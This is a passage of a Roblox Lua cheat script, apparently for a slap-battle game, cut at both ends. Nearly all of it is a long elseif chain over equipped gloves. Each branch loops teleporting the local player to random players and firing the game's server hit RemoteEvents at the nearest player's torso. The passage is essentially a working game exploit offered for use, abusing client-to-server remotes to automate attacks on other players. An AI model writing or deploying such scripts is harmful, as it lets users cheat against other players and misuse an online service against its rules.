local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Golem" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end

elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Grab" then
           while _G.SlapOn do
             local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "God's Hand" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Godshand:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "The Flex" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").FlexHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Error" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Errorhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "spin" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").spinhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Tycoon" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").GeneralHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "OVERKILL" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Overkillhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Plague" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").PlagueHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Phase" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").PhaseH:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Dominance" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DominanceHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "potato" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").potatohit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Hallow Jack" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").HallowHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "CUSTOM" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").CustomHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "CULT" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").CULTHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").bobhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Buddies" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").buddiesHIT:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Orbit" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").Orbihit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Slapple" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").SlappleHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Disarm" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").DisarmH:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Link" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").LinkHit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rhythm" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.5)
local players = game:GetService("Players"):GetPlayers()
local originPosition = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position -- If its being executed on a client
local closestPlayer = nil
local closestDistance = math.huge

for _, player in ipairs(players) do
    if player ~= game:GetService("Players").LocalPlayer then -- Random Child thing.
        local playerPosition = player.Character.HumanoidRootPart.Position
        local distance = (playerPosition - originPosition).magnitude
        if distance < closestDistance then
            closestPlayer = player
            closestDistance = distance
        end
    end
end

if closestPlayer then
    local args = {
        [1] = closestPlayer.Character.Torso
    }

    game:GetService("ReplicatedStorage").rhythmhit:FireServer(unpack(args))
else
    print("There is no players , only the local player. ")
end
task.wait(0.7)
  end
  elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Rojo" then
  while _G.SlapOn do

local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

